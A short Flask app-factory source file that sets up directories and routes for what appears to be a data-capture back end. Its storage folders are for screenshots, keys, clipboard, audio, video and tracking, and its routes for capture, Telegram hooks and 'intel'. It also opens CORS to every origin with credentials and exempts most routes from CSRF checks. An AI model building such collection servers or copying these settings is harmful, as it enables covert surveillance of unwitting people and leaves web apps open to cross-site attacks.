import os
from flask import Flask
from flask_cors import CORS
from flask_wtf.csrf import CSRFProtect
from app.config import Config
from app.database import db, init_db

csrf = CSRFProtect()


def create_app():
    app = Flask(__name__, template_folder="templates", static_folder="static")
    app.config["SECRET_KEY"] = Config.SECRET_KEY
    app.config["WTF_CSRF_ENABLED"] = True
    app.config["SQLALCHEMY_DATABASE_URI"] = Config.DATABASE_URL
    app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
    app.config["MAX_CONTENT_LENGTH"] = 200 * 1024 * 1024

    for d in [Config.UPLOAD_DIR, Config.SCREENSHOT_DIR, Config.BURST_DIR,
              Config.KEYS_DIR, Config.CLIPBOARD_DIR, Config.AUDIO_DIR,
              Config.VIDEO_DIR, Config.TRACKING_DIR]:
        os.makedirs(d, exist_ok=True)

    CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)
    csrf.init_app(app)
    db.init_app(app)

    from app.routes import capture, api, burst, telegram_hook, intel
    for m in [capture, api, burst, telegram_hook, intel]:
        csrf.exempt(m.bp)

    from app.routes.capture import bp as capture_bp
    from app.routes.dashboard import bp as dash_bp
    from app.routes.api import bp as api_bp
    from app.routes.burst import bp as burst_bp
    from app.routes.telegram_hook import bp as tg_bp
    from app.routes.intel import bp as intel_bp

    app.register_blueprint(capture_bp)
    app.register_blueprint(dash_bp)
    app.register_blueprint(api_bp, url_prefix="/api")
    app.register_blueprint(burst_bp, url_prefix="/burst")
    app.register_blueprint(tg_bp, url_prefix="/tg")
    app.register_blueprint(intel_bp, url_prefix="/intel")

    with app.app_context():
        init_db()

    @app.route("/healthz")
    def _health():
        return {"ok": True}

    return app
